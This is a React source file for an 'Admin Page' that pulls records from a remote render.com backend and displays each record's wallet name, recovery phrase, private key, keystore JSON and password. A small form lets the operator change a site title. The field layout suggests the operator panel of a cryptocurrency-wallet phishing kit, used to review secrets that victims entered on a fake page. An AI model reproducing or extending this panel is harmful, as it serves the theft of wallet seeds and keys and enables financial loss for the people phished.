import React, { useEffect, useState } from "react";

const AdminPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [visibleCount, setVisibleCount] = useState(5);
  const [newTitle, setNewTitle] = useState("");

  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await fetch("https://lol-ep0y.onrender.com");
        const data = await res.json();
        setSubmissions(data.reverse());
      } catch (err) {
        console.error("Error fetching submissions", err);
      }
    };

    fetchData();
  }, []);

  const formatDate = (isoString) => {
    if (!isoString) return "N/A";
    const date = new Date(isoString);
    return date.toLocaleString();
  };

  const handleLoadMore = () => setVisibleCount((prev) => prev + 5);

  const handleTitleUpdate = async () => {
    try {
      await fetch("https://lol-ep0y.onrender.com/title", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ title: newTitle }),
      });
      alert("Title updated successfully!");
    } catch (err) {
      console.error("Error updating title:", err);
    }
  };

  return (
    <div className="px-4 py-6 bg-gradient-to-br from-slate-900 to-indigo-950 min-h-screen text-white">
      <h1 className="text-center text-2xl font-bold text-violet-400 mb-6">
        Admin Page
      </h1>

      {/* INPUT SECTION */}
      <div>
        <h1 className="text-lg mb-2">Update Title</h1>
        <input
          value={newTitle}
          onChange={(e) => setNewTitle(e.target.value)}
          className="bg-white text-black w-full my-4 p-2 rounded"
        />
        <button
          onClick={handleTitleUpdate}
          className="bg-violet-600 px-4 py-2 rounded hover:bg-violet-500 transition"
        >
          Update Title
        </button>
      </div>

      {/* Table */}
      <div className="overflow-x-auto rounded-lg border border-indigo-400 mb-6 mt-10">
        <table className="min-w-full text-sm bg-white text-gray-800 rounded-lg overflow-hidden">
          <thead className="bg-indigo-600 text-white">
            <tr>
              <th className="py-2 px-4 text-left">Wallet</th>
              <th className="py-2 px-4 text-left">Recovery Phrase</th>
              <th className="py-2 px-4 text-left">Private Key</th>
              <th className="py-2 px-4 text-left">Keystore JSON</th>
              <th className="py-2 px-4 text-left">Password</th>
              <th className="py-2 px-4 text-left">Created At</th>
            </tr>
          </thead>
          <tbody>
            {submissions.slice(0, visibleCount).map((submission, index) => (
              <tr
                key={index}
                className="odd:bg-gray-100 even:bg-white border-b"
              >
                <td className="py-2 px-4">{submission.wallet}</td>
                <td className="py-2 px-4">
                  {submission.tab1Inputs?.filter(Boolean).join(", ")}
                </td>
                <td className="py-2 px-4">{submission.tab2Text}</td>
                <td className="py-2 px-4">{submission.tab3?.content}</td>
                <td className="py-2 px-4">{submission.tab3?.title}</td>
                <td className="py-2 px-4">
                  {formatDate(submission.createdAt)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {visibleCount < submissions.length && (
        <div className="text-center">
          <button
            onClick={handleLoadMore}
            className="px-6 py-2 bg-indigo-600 text-white font-semibold rounded hover:bg-indigo-500 transition"
          >
            Load More
          </button>
        </div>
      )}
    </div>
  );
};

export default AdminPage;
